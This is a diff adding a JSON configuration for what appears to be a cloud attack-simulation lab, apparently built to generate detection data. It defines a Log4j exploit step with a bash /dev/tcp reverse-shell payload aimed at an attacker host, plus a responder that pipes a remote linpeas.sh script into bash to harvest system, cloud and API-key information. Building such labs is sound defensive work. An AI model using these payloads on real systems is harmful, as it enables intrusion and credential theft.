@@ -1,0 +1,56 @@
+{
+  "context" :  {
+    "global": {
+      "environment"          : "${ environment }",
+      "deployment"           : "${ deployment }"
+    },
+    "gcp" :  {
+      "enabled" : true,
+      "osconfig" :  {
+        "target": {
+          "execute": {
+            "generate_web_traffic": {
+              "enabled": true,
+              "delay": 60,
+              "urls": [
+                "http://localhost:8091/cast"
+              ]
+            },
+            "generate_gcp_cli_traffic": {
+              "enabled": true,
+              "compromised_keys_user" : "khon-traktour",
+              "profile" : "gcp-traffic",
+              "commands": [
+                "if ! command -v jq; then curl -LJ -o /usr/bin/jq https://github.com/jqlang/jq/releases/download/jq-1.7/jq-linux-amd64 && chmod 755 /usr/bin/jq; fi",
+                "log \"User: $(gcloud auth list)\""
+              ]
+            }
+          }
+        },
+        "attacker": {
+          "execute": {
+            "docker_exploit_log4j_app": {
+              "enabled": true,
+              "attacker_http_port": 8088,
+              "attacker_ldap_port": 1389,
+              "attacker_ip": "log4jc-attacker-${ deployment }.${ dynu_dns_domain }",
+              "target_port": 8080,
+              "payload": "/bin/bash -c \"TASK=gcpiam2cloudsql /bin/bash -i >& /dev/tcp/log4jc-attacker-${ deployment }.${ dynu_dns_domain }/4444 0>&1\" | tee /tmp/log.txt",
+              "attack_delay": 50400,
+              "reverse_shell_port": 4444
+            }
+          },
+          "responder": {
+            "reverse_shell_multistage": {
+              "enabled": true,
+              "listen_ip": "0.0.0.0",
+              "listen_port": "4444",
+              "payload": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex | tee /tmp/linpeas.txt",
+              "attack_delay": 50400
+            }
+          }
+        }
+      }
+    }
+  }
+}
